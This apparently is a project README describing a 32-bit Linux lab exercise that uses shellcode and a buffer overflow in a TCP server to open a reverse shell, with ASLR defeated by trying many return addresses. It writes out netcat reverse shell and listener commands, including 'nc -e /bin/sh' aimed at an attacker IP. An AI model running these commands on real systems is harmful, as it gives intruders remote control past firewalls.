# ReverseShell

(System Details : 32 bit architecture, AT&T syntax, Linux)

Reverse Shell- In systems where a firewall in place blocks incoming remote connection requests, organisations support establishing remote connections from the system to the outside world. 

Attackers make use of this functionality to fail the protection provided by firewall.

Reverse shell can be established in many ways. It is essentially a tcp connection over a process which in this case would be any shell bash,dash,sh, or zsh.

We can use netcat, perl, python, bash to create a reverse shell.

I have used a shellcode to exploit a buffer overflow vulnerability in a server program listening to TCP connections. First, I wrote an assembly program to establish a reverse shell, converted it to a bytecode and overflew the buffer to make the server make a connection to the attackers ip address listening over some port.

Netcat commands to establish a reverse shell :
Victim PC: (Inside the protection of firewall) "nc -e /bin/sh <attacker_ip> <port>"
Attacker pc: "nc -nlvp <port>"
{First try executing these commands in two different shell windows and see if you could execute shell commands inside attackers shell} 
  
Now keep the attackers PC listening over some port and exploit the buffer overflow vulnerability in the server program to make it connect to the attackers PC.

Code:
myattempt.s (Assembly code to execute "nc -e /bin/sh 192.168.156.3 4440")(Find and replace the ip_address with desired value in the assembly code. Do not forget to convert it to hex.)
Convert linked and loaded assembly code to bytecode.
exploit.py : Python exploit code to connect to and exploit the server vulnerability
finalexp.py : To run the exploit code with different return addresses to beat ASLR.


 
